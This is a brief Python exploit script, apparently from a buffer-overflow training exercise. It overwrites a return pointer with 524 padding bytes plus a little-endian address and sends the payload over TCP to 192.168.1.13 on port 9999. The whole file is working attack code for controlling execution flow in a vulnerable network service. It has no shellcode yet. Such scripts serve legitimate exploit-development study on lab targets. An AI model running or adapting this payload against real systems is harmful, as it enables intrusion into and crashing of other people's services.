#!/usr/bin/python3
#inserting the found pointer in little endian format
import sys, socket

buffer = b"A" * 524 + b"\xf3\x12\x17\x31"  

print("sending payload...")
payload = buffer + b'\r\n'               
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.13',9999))
s.send(payload)
s.close()
